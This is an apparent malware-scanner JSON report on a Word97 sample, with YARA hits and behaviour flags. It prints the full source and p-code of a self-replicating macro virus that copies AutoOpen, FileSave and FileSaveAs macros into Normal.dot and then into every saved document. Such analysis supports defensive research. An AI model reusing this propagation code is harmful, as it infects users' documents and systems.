{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoOpen\"",
            "Attribute VB_Name = \"FileSaveAs\"",
            "Attribute VB_Name = \"FileSave\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "open": "May open a file",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "\n\n\nPublic Sub MAIN()\nDim sMe$\nDim sTMacro$\nOn Error Resume Next\nWordBasic.ToolsMacro Name:=\"Normal.dot:AAAZA\" + \"O\", Delete:=1\nWordBasic.ToolsMacro Name:=\"Normal.dot:AAAZF\" + \"S\", Delete:=1\nWordBasic.ToolsMacro Name:=\"Normal.dot:FileSaveAs\", Delete:=1\nWordBasic.ToolsMacro Name:=\"Normal.dot:FileSave\", Delete:=1\nWordBasic.ToolsMacro Name:=\"Normal.dot:FileNew\", Delete:=1\nWordBasic.ToolsMacro Name:=\"Normal.dot:PayLoad\", Delete:=1\nWordBasic.ToolsMacro Name:=\"Normal.dot:FileOpen\", Delete:=1\n\n\nOn Error GoTo -1: On Error GoTo Abort\nsMe$ = WordBasic.[FileName$]()\n\nsTMacro$ = sMe$ + \":AutoOpen\"\nWordBasic.MacroCopy sTMacro$, \"Global:AutoOpen\"\n\nsTMacro$ = sMe$ + \":FileSave\"\nWordBasic.MacroCopy sTMacro$, \"Global:Filesave\"\n\nsTMacro$ = sMe$ + \":FileSaveAs\"\nWordBasic.MacroCopy sTMacro$, \"Global:FileSaveAs\"\n\nsTMacro$ = sMe$ + \":FileNew\"\nWordBasic.MacroCopy sTMacro$, \"Global:FileNew\"\n\nsTMacro$ = sMe$ + \":FileOpen\"\nWordBasic.MacroCopy sTMacro$, \"Global:FileOpen\"\n\nsTMacro$ = sMe$ + \":Payb\"\nWordBasic.MacroCopy sTMacro$, \"Global:PayLoad\"\n\nWordBasic.MsgBox \"Your system may or may not be clean. Please close CleanW and the open it AGAIN.\"\nAbort:\nEnd Sub\n\n\n\nPublic Sub MAIN()\nAttribute MAIN.VB_Description = \"Saves a copy of the document in a separate file\"\nAttribute MAIN.VB_ProcData.VB_Invoke_Func = \"TemplateProject.FileSaveAs.MAIN\"\nDim sMe$\nDim sTMacro$\n'this becomes the FileSaveAs for the global template\nDim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)\nOn Error GoTo -1: On Error GoTo Bail\nWordBasic.CurValues.FileSaveAs dlg\nWordBasic.Dialog.FileSaveAs dlg\nIf dlg.Format = 0 Then dlg.Format = 1\nsMe$ = WordBasic.[FileName$]()\n\nsTMacro$ = sMe$ + \":AutoOpen\"\nWordBasic.MacroCopy \"Global:AutoOpen\", sTMacro$\n\nsTMacro$ = sMe$ + \":FileSaveAs\"\nWordBasic.MacroCopy \"Global:FileSaveAs\", sTMacro$\n\nsTMacro$ = sMe$ + \":FileSave\"\nWordBasic.MacroCopy \"Global:FileSave\", sTMacro$\n\nsTMacro$ = sMe$ + \":FileNew\"\nWordBasic.MacroCopy \"Global:FileNew\", sTMacro$\n\nWordBasic.FileSaveAs dlg\nGoTo Done\n\nBail:\nIf Err.Number <> 102 Then\n    WordBasic.FileSaveAs dlg\nEnd If\nDone:\nEnd Sub\n\n\n\nPublic Sub MAIN()\nAttribute MAIN.VB_Description = \"Saves the active document or template\"\nAttribute MAIN.VB_ProcData.VB_Invoke_Func = \"TemplateProject.FileSave.MAIN\"\n\nEnd Sub\n\n' Processing file: VirusShare_7f2860c1f8e046eada71302d24db8bf8\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 965 bytes\n' Macros/VBA/AutoOpen - 2556 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tDim \n' \tVarDefn sMe\n' Line #3:\n' \tDim \n' \tVarDefn sTMacro\n' Line #4:\n' \tOnError (Resume Next) \n' Line #5:\n' \tLitStr 0x0010 \"Normal.dot:AAAZA\"\n' \tLitStr 0x0001 \"O\"\n' \tAdd \n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Delete \n' \tLd WordBasic \n' \tArgsMemCall ToolsMacro 0x0002 \n' Line #6:\n' \tLitStr 0x0010 \"Normal.dot:AAAZF\"\n' \tLitStr 0x0001 \"S\"\n' \tAdd \n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Delete \n' \tLd WordBasic \n' \tArgsMemCall ToolsMacro 0x0002 \n' Line #7:\n' \tLitStr 0x0015 \"Normal.dot:FileSaveAs\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Delete \n' \tLd WordBasic \n' \tArgsMemCall ToolsMacro 0x0002 \n' Line #8:\n' \tLitStr 0x0013 \"Normal.dot:FileSave\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Delete \n' \tLd WordBasic \n' \tArgsMemCall ToolsMacro 0x0002 \n' Line #9:\n' \tLitStr 0x0012 \"Normal.dot:FileNew\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Delete \n' \tLd WordBasic \n' \tArgsMemCall ToolsMacro 0x0002 \n' Line #10:\n' \tLitStr 0x0012 \"Normal.dot:PayLoad\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Delete \n' \tLd WordBasic \n' \tArgsMemCall ToolsMacro 0x0002 \n' Line #11:\n' \tLitStr 0x0013 \"Normal.dot:FileOpen\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Delete \n' \tLd WordBasic \n' \tArgsMemCall ToolsMacro 0x0002 \n' Line #12:\n' Line #13:\n' Line #14:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError Abort \n' Line #15:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt sMe$ \n' Line #16:\n' Line #17:\n' \tLd sMe$ \n' \tLitStr 0x0009 \":AutoOpen\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #18:\n' \tLd sTMacro$ \n' \tLitStr 0x000F \"Global:AutoOpen\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #19:\n' Line #20:\n' \tLd sMe$ \n' \tLitStr 0x0009 \":FileSave\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #21:\n' \tLd sTMacro$ \n' \tLitStr 0x000F \"Global:Filesave\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #22:\n' Line #23:\n' \tLd sMe$ \n' \tLitStr 0x000B \":FileSaveAs\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #24:\n' \tLd sTMacro$ \n' \tLitStr 0x0011 \"Global:FileSaveAs\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #25:\n' Line #26:\n' \tLd sMe$ \n' \tLitStr 0x0008 \":FileNew\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #27:\n' \tLd sTMacro$ \n' \tLitStr 0x000E \"Global:FileNew\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #28:\n' Line #29:\n' \tLd sMe$ \n' \tLitStr 0x0009 \":FileOpen\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #30:\n' \tLd sTMacro$ \n' \tLitStr 0x000F \"Global:FileOpen\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #31:\n' Line #32:\n' \tLd sMe$ \n' \tLitStr 0x0005 \":Payb\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #33:\n' \tLd sTMacro$ \n' \tLitStr 0x000E \"Global:PayLoad\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #34:\n' Line #35:\n' \tLitStr 0x004F \"Your system may or may not be clean. Please close CleanW and the open it AGAIN.\"\n' \tLd WordBasic \n' \tArgsMemCall MsgBox 0x0001 \n' Line #36:\n' \tLabel Abort \n' Line #37:\n' \tEndSub \n' Macros/VBA/FileSaveAs - 2384 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tDim \n' \tVarDefn sMe\n' Line #3:\n' \tDim \n' \tVarDefn sTMacro\n' Line #4:\n' \tQuoteRem 0x0000 0x0033 \"this becomes the FileSaveAs for the global template\"\n' Line #5:\n' \tDim \n' \tVarDefn dlg (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FileSaveAs 0x0001 \n' \tSet dlg \n' Line #6:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError Bail \n' Line #7:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #8:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd Dialog \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #9:\n' \tLd dlg \n' \tMemLd Format$ \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLd dlg \n' \tMemSt Format$ \n' \tEndIf \n' Line #10:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt sMe$ \n' Line #11:\n' Line #12:\n' \tLd sMe$ \n' \tLitStr 0x0009 \":AutoOpen\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #13:\n' \tLitStr 0x000F \"Global:AutoOpen\"\n' \tLd sTMacro$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #14:\n' Line #15:\n' \tLd sMe$ \n' \tLitStr 0x000B \":FileSaveAs\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #16:\n' \tLitStr 0x0011 \"Global:FileSaveAs\"\n' \tLd sTMacro$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #17:\n' Line #18:\n' \tLd sMe$ \n' \tLitStr 0x0009 \":FileSave\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #19:\n' \tLitStr 0x000F \"Global:FileSave\"\n' \tLd sTMacro$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #20:\n' Line #21:\n' \tLd sMe$ \n' \tLitStr 0x0008 \":FileNew\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #22:\n' \tLitStr 0x000E \"Global:FileNew\"\n' \tLd sTMacro$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #23:\n' Line #24:\n' \tLd dlg \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #25:\n' \tGoTo Done \n' Line #26:\n' Line #27:\n' \tLabel Bail \n' Line #28:\n' \tLd Err \n' \tMemLd Number \n' \tLitDI2 0x0066 \n' \tNe \n' \tIfBlock \n' Line #29:\n' \tLd dlg \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #30:\n' \tEndIfBlock \n' Line #31:\n' \tLabel Done \n' Line #32:\n' \tEndSub \n' Macros/VBA/FileSave - 1026 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' Line #3:\n' \tEndSub \n"
    },
    "filename": "VirusShare_7f2860c1f8e046eada71302d24db8bf8",
    "filesize": 36864,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: This is a Word97 macro goat file,  1997 by Costin RAIU craiu@gecad, Author: Costin RAIU, Template: Normal, Last Saved By: Costin Raiu, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sun Jul 18 23:02:00 1999, Last Saved Time/Date: Sun Jul 18 23:02:00 1999, Number of Pages: 1, Number of Words: 77, Number of Characters: 440, Security: 0",
    "hashes": {
        "md5": "7f2860c1f8e046eada71302d24db8bf8",
        "sha1": "4c40be5c1fd0ab296867333a615a2286ad50ff92",
        "sha256": "ddde4f4091fbe97ca5fd6f34fa644d6e95144757cc1dd28904e6a4da14f5bc46"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjBB",
            "This is a Word97 macro goat file,  1997 by Costin RAIU ",
            " HYPERLINK \"mailto:craiu@gecad.ro\" ",
            "craiu@gecad.ro",
            "Reproduction of any part of this document is prohibited without the permission from the author.",
            "12345678901234567890123456789012345678901234567890123456789012345678901234567890",
            "12345678901234567890123456789012345678901234567890123456789012345678901234567890",
            "12345678901234567890123456789012345678901234567890123456789012345678901234567890",
            "12345678901234567890123456789012345678901234567890123456789012345678901234567890",
            "Text box !!! (embedded control)",
            "/ =!",
            "B7&B7&",
            "This is a Word97 macro goat file,  1997 by Costin RAIU craiu@gecad",
            "Costin RAIU",
            "Normal",
            "Costin Raiu",
            "Microsoft Word 8.0",
            "|(i\u047e",
            "|(i\u047e",
            "RSN\\|/",
            "This is a Word97 macro goat file,  1997 by Costin RAIU craiu@gecad",
            "Title",
            "_PID_GUID",
            "_PID_HLINKS",
            "p3i\u047e",
            " 3i\u047e",
            " 3i\u047e",
            "\u07aa3i\u047e",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "Normal.dot:AAAZA",
            "Normal.dot:AAAZF",
            "Normal.dot:FileSaveAs",
            "Normal.dot:FileSave",
            "Normal.dot:FileNew",
            "Normal.dot:PayLoad",
            "Normal.dot:FileOpen",
            ":AutoOpen",
            "Global:AutoOpen",
            ":FileSave",
            "Global:Filesave",
            ":FileSaveAs",
            "Global:FileSaveAs",
            ":FileNew",
            "Global:FileNew ",
            ":FileOpen",
            "Global:FileOpen",
            ":Payb",
            "Global:PayLoad ",
            "Your system may or may not be clean. Please close CleanW and the open it AGAIN.",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oOpen\"",
            "Public",
            " Sub MAI",
            "Dim  sMe$",
            "acro",
            "Error Re",
            "Next",
            "WordBas",
            "ic.Tools",
            ":=\"No",
            "rmal.dot",
            ":AAAZA\" ",
            "+ \"O\", D",
            "elete:=1",
            "?S2?FileSaveAs:",
            "PayLoad;",
            "rGoTo -1: K",
            "Aborv7A@x[Q",
            "w$]A",
            "sD@\t",
            "Copy",
            ", \"Global\t",
            "s@{(E",
            "Ib(2eO",
            "sgBox ",
            "\"Your sy",
            "stem may",
            "not b",
            "e clean.T P",
            "W and t",
            "he o` ith AG",
            "Saves a copy of the document in a separate file",
            "TemplateProject.FileSaveAs.MAINdot:FP\"",
            "ot:F`6",
            "this becomes the FileSaveAs for the global template",
            "$ +  ",
            "asic.M ",
            "ileSav ",
            "Wo  \"",
            ":AutoOpen",
            "Global:AutoOpen",
            ".dot:P  \"",
            ":FileSaveAs",
            "Global:FileSaveAs",
            ":FileSave",
            "Global:FileSave",
            ":FileNew",
            "Global:FileNew  $",
            "Attribut",
            "e VB_Nam",
            "e = \"Fil",
            "eSaveAs\"",
            "Publ",
            "ic Sub MAIN()",
            "vDescription",
            "s a copy",
            " of the ",
            "document",
            "2sepatra",
            "RProcData",
            "Invoke_F",
            "^Temp",
            "\"ject.",
            "NDim @sMe$",
            "\tT Macro",
            "his beco",
            "\tglobal",
            " t2!dlg  As Ob8: ",
            "Set ",
            "\t= W",
            "ordBasic",
            ".DialogR\t",
            ".rdI(Fal",
            "On Er",
            "2GoTo -",
            "Bail",
            "'CurValues",
            ".For",
            "0 Then\t1",
            "+ \":AutoOpenYG",
            "BXC{\"GO\t, s",
            "New ",
            "0Done",
            "p.Numb",
            "er <> 10b2p",
            "End If",
            "Saves the active document or template",
            "TemplateProject.FileSave.MAIN",
            "Attribut",
            "e VB_Nam",
            "e = \"Fil",
            "eSave\"",
            "Public",
            " Sub MAI`N()",
            "rDescrip0tion",
            "the acti",
            "ve docum",
            "ent or templat",
            "ProcData",
            "TInvoke_Func",
            "\"ject.",
            "537924ee7",
            "737924ee9",
            "837924ee9",
            "937924ee9",
            "\u062d;g\\=",
            "\u06ad;g\\=",
            "\u072d;g\\=",
            "\u07ad;g\\=",
            "Wordk",
            "Win16~",
            "Win32",
            "GOAT97-1T",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Module1b",
            "AutoOpen*",
            "MAIN,",
            "sTMacro",
            "WordBasic",
            "ToolsMacrou",
            "Deletex",
            "Abort",
            "FileName$m",
            "MacroCopyE",
            "MsgBoxR",
            "FileSaveAs",
            "dlg-",
            "DialogRecord",
            "Bail>",
            "CurValues\u0224",
            "Dialogf",
            "Done",
            "Erro",
            "Number-",
            "FileSave",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#D:",
            "\\WINNT\\S",
            "ystem32\\",
            "StdOle2.",
            "Tlb#OLE ",
            "Automati,on",
            "Forms>",
            "FFE52",
            "14D1-3D5",
            "A-11D3-9",
            "F21CD0277C",
            "WD#Microsoft ",
            " Libprary",
            "P27X155",
            "EMP\\VBE\\\t&EX&.E",
            "CvOf(ficDvO@sf",
            "cBv*~*D",
            "F8D04C-5",
            "S01B-BHDE5",
            "SAA@u4",
            "Sgram",
            " Files\\o1",
            "0O9`7.DLLHV",
            " (8.0V",
            "isDocument",
            "h@4s",
            "Openb",
            "NSav eAs",
            "ThisDocument",
            "AutoOpen",
            "FileSaveAs",
            "FileSave",
            "ID=\"{673BADDF-3D5C-11D3-97ED-000021CD277C}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoOpen",
            "Module=FileSaveAs",
            "Module=FileSave",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"6E6C85399DC90FCD0FCD0FCD0FCD\"",
            "DPB=\"DCDE37A7CB14CC14CC14\"",
            "GC=\"4A48A15D0E5E0E5EF1\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {
            "String too long": [
                "12345678901234567890123456789012345678901234567890123456789012345678901234567890"
            ]
        },
        "ip": [],
        "url": []
    },
    "time": "0:00:00.307791",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
